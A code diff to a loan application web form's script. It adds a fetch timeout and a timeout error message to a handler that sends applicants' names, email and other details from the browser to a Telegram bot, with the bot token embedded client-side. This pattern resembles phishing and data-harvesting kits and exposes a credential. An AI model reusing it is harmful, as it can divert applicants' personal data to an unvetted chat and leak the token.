@@ -567,7 +567,7 @@
             document.getElementById('step2').classList.add('active');
         });
 
-        // Form Submission to Telegram with Guaranteed Error Reset
+        // Form Submission to Telegram with Timeout Protector
         document.getElementById('loanForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -578,7 +578,7 @@
             submitBtn.textContent = 'SUBMITTING...';
             statusBox.style.display = 'none';
 
-                 try {
+                      try {
                 const firstName = document.getElementById('firstName').value;
                 const lastName = document.getElementById('lastName').value;
                 const email = document.getElementById('email').value || 'N/A';
@@ -601,6 +601,9 @@
 
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 8000);
+
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -608,8 +611,10 @@
                         chat_id: chatId,
                         text: message,
                         parse_mode: 'Markdown'
-                    })
+                    }),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
 
                 const data = await response.json();
 
@@ -625,7 +630,7 @@
                 }
             } catch (error) {
                 console.error(error);
-                statusBox.textContent = 'Submission failed: ' + error.message;
+                statusBox.textContent = error.name === 'AbortError' ? 'Submission timed out. Please check your connection.' : 'Submission failed: ' + error.message;
                 statusBox.className = 'status-msg';
                 statusBox.style.background = '#fee2e2';
                 statusBox.style.color = '#991b1b';
